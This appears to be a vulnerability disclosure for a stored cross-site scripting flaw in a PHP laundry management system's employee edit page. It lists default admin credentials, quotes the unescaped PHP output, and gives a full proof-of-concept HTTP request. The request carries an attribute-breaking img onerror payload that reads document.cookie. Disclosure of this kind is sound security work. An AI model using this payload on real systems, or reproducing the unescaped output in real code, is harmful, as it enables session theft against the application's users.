Laundry Management System Store XSS (/ci_laundry/karyawan/edit) 

Vendor Homepage:

```
https://www.sourcecodester.com/php-ci-laundry-management-system-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
admin
admin123
```

Affected Page:

```
/ci_laundry/karyawan/edit
```

This code snippet is potentially vulnerable to Cross-Site Scripting (XSS) attacks. The issue lies in the direct output of the `$karyawan->alamat` variable's value into the `value` attribute using `<?php echo $karyawan->alamat ?>`. If `$karyawan->alamat` contains malicious JavaScript code, then this code will be executed when the page loads and renders this `input` tag.

```
                                <div class="form-group">
                                    <label class="control-label ">Address</label>
                                    <input type="text"  class="form-control" placeholder='Employee Address' name="alamat"  value="<?php echo $karyawan->alamat ?>" required>
                                    <div class="invalid-feedback">
                                    Fill in the employee's address!
                                    </div>
                                </div>
```

Proof of vulnerability:

Request:

```
POST /ci_laundry/karyawan/edit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 198
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_laundry/karyawan
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; ci_session=8u304rgjn04iv4m3mrloksfrovf11plm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

karyawan_id=K002&nama_karyawan=asdasdas&jeniskelamin=Male&alamat="><img+src%3d1+onerror%3dalert(document.cookie)>&no_hp=09123456789&gaji_perbulan=111&tgl_bergabung=2024-04-25&tgl_berhenti=2024-04-26
```

<img width="1345" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/2b31a829-840c-499d-87b1-99da32852f27">
<img width="1321" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/2c859473-dccc-40ca-99c2-4d6d67595b3e">

